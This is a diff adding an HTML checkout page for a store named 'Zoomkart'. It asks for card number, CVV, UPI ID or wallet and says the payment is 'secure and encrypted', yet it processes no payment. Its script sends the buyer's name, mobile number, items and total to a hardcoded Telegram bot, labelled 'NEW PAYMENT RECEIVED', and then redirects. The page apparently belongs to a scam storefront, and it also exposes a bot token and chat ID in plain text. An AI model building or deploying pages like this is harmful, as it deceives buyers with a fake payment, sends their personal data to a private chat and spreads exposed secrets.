@@ -1,0 +1,513 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Online Payment | Zoomkart</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --primary-color: #6c63ff;
+            --secondary-color: #ff6584;
+            --dark-color: #333;
+            --light-color: #f8f9fa;
+            --success-color: #28a745;
+            --warning-color: #ffc107;
+            --danger-color: #dc3545;
+            --white: #fff;
+            --black: #000;
+            --gray: #6c757d;
+            --light-gray: #f1f1f1;
+            --shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+            --transition: all 0.3s ease;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+
+        body {
+            font-family: 'Poppins', sans-serif;
+            background: #f5f7fa;
+            color: var(--dark-color);
+            line-height: 1.6;
+        }
+
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+
+        .header {
+            text-align: center;
+            padding: 30px 0;
+        }
+
+        .logo {
+            font-size: 2rem;
+            font-weight: 700;
+            color: var(--primary-color);
+            margin-bottom: 10px;
+        }
+
+        .page-title {
+            font-size: 1.8rem;
+            margin-bottom: 30px;
+            color: var(--dark-color);
+        }
+
+        .payment-container {
+            display: flex;
+            flex-wrap: wrap;
+            gap: 30px;
+            margin-top: 20px;
+        }
+
+        .order-summary {
+            flex: 1;
+            min-width: 300px;
+            background: var(--white);
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: var(--shadow);
+        }
+
+        .payment-methods {
+            flex: 1;
+            min-width: 300px;
+            background: var(--white);
+            border-radius: 10px;
+            padding: 25px;
+            box-shadow: var(--shadow);
+        }
+
+        .section-title {
+            font-size: 1.3rem;
+            margin-bottom: 20px;
+            color: var(--primary-color);
+            padding-bottom: 10px;
+            border-bottom: 2px solid var(--light-gray);
+        }
+
+        .user-info {
+            margin-bottom: 20px;
+        }
+
+        .info-row {
+            display: flex;
+            margin-bottom: 10px;
+        }
+
+        .info-label {
+            font-weight: 600;
+            width: 120px;
+            color: var(--gray);
+        }
+
+        .info-value {
+            flex: 1;
+        }
+
+        .order-items {
+            margin: 20px 0;
+        }
+
+        .order-item {
+            display: flex;
+            justify-content: space-between;
+            padding: 10px 0;
+            border-bottom: 1px solid var(--light-gray);
+        }
+
+        .item-name {
+            flex: 2;
+        }
+
+        .item-qty {
+            flex: 1;
+            text-align: center;
+        }
+
+        .item-price {
+            flex: 1;
+            text-align: right;
+        }
+
+        .order-total {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 20px;
+            padding-top: 15px;
+            border-top: 2px solid var(--light-gray);
+            font-size: 1.2rem;
+            font-weight: 600;
+        }
+
+        .payment-method {
+            margin-bottom: 20px;
+        }
+
+        .payment-option {
+            display: flex;
+            align-items: center;
+            padding: 15px;
+            margin-bottom: 15px;
+            border: 1px solid var(--light-gray);
+            border-radius: 8px;
+            cursor: pointer;
+            transition: var(--transition);
+        }
+
+        .payment-option:hover {
+            border-color: var(--primary-color);
+        }
+
+        .payment-option.active {
+            border-color: var(--primary-color);
+            background-color: rgba(108, 99, 255, 0.05);
+        }
+
+        .payment-icon {
+            font-size: 1.5rem;
+            margin-right: 15px;
+            color: var(--primary-color);
+        }
+
+        .payment-label {
+            flex: 1;
+            font-weight: 500;
+        }
+
+        .payment-form {
+            margin-top: 20px;
+            display: none;
+        }
+
+        .payment-form.active {
+            display: block;
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        .form-label {
+            display: block;
+            margin-bottom: 8px;
+            font-weight: 500;
+        }
+
+        .form-control {
+            width: 100%;
+            padding: 12px 15px;
+            border: 1px solid var(--light-gray);
+            border-radius: 6px;
+            font-family: 'Poppins', sans-serif;
+            transition: var(--transition);
+        }
+
+        .form-control:focus {
+            border-color: var(--primary-color);
+            outline: none;
+            box-shadow: 0 0 0 3px rgba(108, 99, 255, 0.2);
+        }
+
+        .form-row {
+            display: flex;
+            gap: 15px;
+        }
+
+        .form-row .form-group {
+            flex: 1;
+        }
+
+        .btn {
+            display: inline-block;
+            padding: 15px 25px;
+            background: var(--primary-color);
+            color: var(--white);
+            border: none;
+            border-radius: 6px;
+            font-size: 1rem;
+            font-weight: 500;
+            cursor: pointer;
+            transition: var(--transition);
+            width: 100%;
+            text-align: center;
+            margin-top: 20px;
+        }
+
+        .btn:hover {
+            background: var(--secondary-color);
+            transform: translateY(-2px);
+            box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
+        }
+
+        .btn:active {
+            transform: translateY(0);
+        }
+
+        .secure-note {
+            text-align: center;
+            margin-top: 20px;
+            font-size: 0.9rem;
+            color: var(--gray);
+        }
+
+        .secure-note i {
+            color: var(--success-color);
+            margin-right: 5px;
+        }
+
+        @media (max-width: 768px) {
+            .payment-container {
+                flex-direction: column;
+            }
+            
+            .order-summary, .payment-methods {
+                width: 100%;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="header">
+            <div class="logo">Zoomkart</div>
+            <h1 class="page-title">Confirm & Pay Securely</h1>
+        </div>
+
+        <div class="payment-container">
+            <!-- Order Summary Section -->
+            <div class="order-summary">
+                <h2 class="section-title">Order Summary</h2>
+                
+                <div class="user-info">
+                    <div class="info-row">
+                        <div class="info-label">Name:</div>
+                        <div class="info-value" id="userName">Loading...</div>
+                    </div>
+                    <div class="info-row">
+                        <div class="info-label">Mobile:</div>
+                        <div class="info-value" id="userMobile">Loading...</div>
+                    </div>
+                </div>
+                
+                <div class="order-items">
+                    <h3>Your Items</h3>
+                    <div id="orderItemsList">
+                        <!-- Items will be loaded here -->
+                    </div>
+                </div>
+                
+                <div class="order-total">
+                    <div>Total Amount:</div>
+                    <div id="orderTotal">₹0</div>
+                </div>
+            </div>
+
+            <!-- Payment Methods Section -->
+            <div class="payment-methods">
+                <h2 class="section-title">Payment Method</h2>
+                
+                <div class="payment-method">
+                    <div class="payment-option active" data-method="card">
+                        <i class="far fa-credit-card payment-icon"></i>
+                        <div class="payment-label">Credit/Debit Card</div>
+                    </div>
+                    
+                    <div class="payment-form active" id="cardForm">
+                        <div class="form-group">
+                            <label class="form-label">Card Number</label>
+                            <input type="text" class="form-control" placeholder="1234 5678 9012 3456" id="cardNumber">
+                        </div>
+                        
+                        <div class="form-row">
+                            <div class="form-group">
+                                <label class="form-label">Expiry Date</label>
+                                <input type="text" class="form-control" placeholder="MM/YY" id="cardExpiry">
+                            </div>
+                            <div class="form-group">
+                                <label class="form-label">CVV</label>
+                                <input type="text" class="form-control" placeholder="123" id="cardCvv">
+                            </div>
+                        </div>
+                        
+                        <div class="form-group">
+                            <label class="form-label">Name on Card</label>
+                            <input type="text" class="form-control" placeholder="John Doe" id="cardName">
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="payment-method">
+                    <div class="payment-option" data-method="upi">
+                        <i class="fas fa-mobile-alt payment-icon"></i>
+                        <div class="payment-label">UPI Payment</div>
+                    </div>
+                    
+                    <div class="payment-form" id="upiForm">
+                        <div class="form-group">
+                            <label class="form-label">UPI ID</label>
+                            <input type="text" class="form-control" placeholder="yourname@upi" id="upiId">
+                        </div>
+                    </div>
+                </div>
+                
+                <div class="payment-method">
+                    <div class="payment-option" data-method="wallet">
+                        <i class="fas fa-wallet payment-icon"></i>
+                        <div class="payment-label">Wallet</div>
+                    </div>
+                    
+                    <div class="payment-form" id="walletForm">
+                        <div class="form-group">
+                            <label class="form-label">Select Wallet</label>
+                            <select class="form-control" id="walletType">
+                                <option value="">Select your wallet</option>
+                                <option value="paytm">Paytm</option>
+                                <option value="phonepe">PhonePe</option>
+                                <option value="amazonpay">Amazon Pay</option>
+                            </select>
+                        </div>
+                    </div>
+                </div>
+                
+                <button class="btn" id="payButton">Confirm & Pay</button>
+                
+                <div class="secure-note">
+                    <i class="fas fa-lock"></i> Your payment is secure and encrypted
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        document.addEventListener('DOMContentLoaded', function() {
+            // Get cart data from localStorage
+            const cart = JSON.parse(localStorage.getItem('cart')) || [];
+            const userData = JSON.parse(localStorage.getItem('userData')) || {};
+            
+            // Display user info
+            document.getElementById('userName').textContent = userData.name || 'Guest User';
+            document.getElementById('userMobile').textContent = userData.mobile || 'Not provided';
+            
+            // Display order items
+            const orderItemsList = document.getElementById('orderItemsList');
+            let totalAmount = 0;
+            
+            if (cart.length === 0) {
+                orderItemsList.innerHTML = '<p>No items in cart</p>';
+            } else {
+                cart.forEach(item => {
+                    const itemTotal = item.price * item.quantity;
+                    totalAmount += itemTotal;
+                    
+                    const itemElement = document.createElement('div');
+                    itemElement.className = 'order-item';
+                    itemElement.innerHTML = `
+                        <div class="item-name">${item.name}</div>
+                        <div class="item-qty">${item.quantity}x</div>
+                        <div class="item-price">₹${itemTotal}</div>
+                    `;
+                    orderItemsList.appendChild(itemElement);
+                });
+            }
+            
+            // Display total amount
+            document.getElementById('orderTotal').textContent = `₹${totalAmount}`;
+            
+            // Payment method selection
+            const paymentOptions = document.querySelectorAll('.payment-option');
+            const paymentForms = document.querySelectorAll('.payment-form');
+            
+            paymentOptions.forEach(option => {
+                option.addEventListener('click', function() {
+                    // Remove active class from all options
+                    paymentOptions.forEach(opt => opt.classList.remove('active'));
+                    paymentForms.forEach(form => form.classList.remove('active'));
+                    
+                    // Add active class to selected option
+                    this.classList.add('active');
+                    const method = this.getAttribute('data-method');
+                    document.getElementById(`${method}Form`).classList.add('active');
+                });
+            });
+            
+            // Payment button click
+            document.getElementById('payButton').addEventListener('click', function() {
+                const activeMethod = document.querySelector('.payment-option.active').getAttribute('data-method');
+                let isValid = true;
+                
+                // Validate form based on active payment method
+                if (activeMethod === 'card') {
+                    const cardNumber = document.getElementById('cardNumber').value;
+                    const cardExpiry = document.getElementById('cardExpiry').value;
+                    const cardCvv = document.getElementById('cardCvv').value;
+                    const cardName = document.getElementById('cardName').value;
+                    
+                    if (!cardNumber || !cardExpiry || !cardCvv || !cardName) {
+                        isValid = false;
+                        alert('Please fill all card details');
+                    }
+                } else if (activeMethod === 'upi') {
+                    const upiId = document.getElementById('upiId').value;
+                    if (!upiId || !upiId.includes('@')) {
+                        isValid = false;
+                        alert('Please enter a valid UPI ID');
+                    }
+                } else if (activeMethod === 'wallet') {
+                    const walletType = document.getElementById('walletType').value;
+                    if (!walletType) {
+                        isValid = false;
+                        alert('Please select a wallet');
+                    }
+                }
+                
+                if (isValid) {
+                    processPayment();
+                }
+            });
+            
+            // Process payment and send to Telegram
+            function processPayment() {
+                const userName = document.getElementById('userName').textContent;
+                const userMobile = document.getElementById('userMobile').textContent;
+                const totalAmount = document.getElementById('orderTotal').textContent;
+                
+                // Prepare items list
+                let itemsList = '';
+                cart.forEach(item => {
+                    itemsList += `- ${item.name} (${item.quantity}x) - ₹${item.price * item.quantity}\n`;
+                });
+                
+                // Telegram bot API
+                const botToken = '7570580492:AAEhq5Oz1mfD7SMIalPFoz8ccOwJGbwigHU';
+                const chatId = '5165964724';
+                
+                const message = `🛍️ NEW PAYMENT RECEIVED on Zoomkart ✅\n\n👤 Name: ${userName}\n📱 Mobile: ${userMobile}\n🛒 Items: \n${itemsList}\n💰 Total Amount: ${totalAmount}\n\n📦 Proceed to dispatch order.`;
+                
+                // Encode message for URL
+                const encodedMessage = encodeURIComponent(message);
+                
+                // Send to Telegram bot
+                fetch(`https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodedMessage}`)
+                    .then(response => response.json())
+                    .then(data => {
+                        // Redirect to success page
+                        window.location.href = 'done.html';
+                    })
+                    .catch(error => {
+                        console.error('Error sending to Telegram:', error);
+                        // Still redirect even if Telegram fails
+                        window.location.href = 'done.html';
+                    });
+            }
+        });
+    </script>
+</body>
+</html>
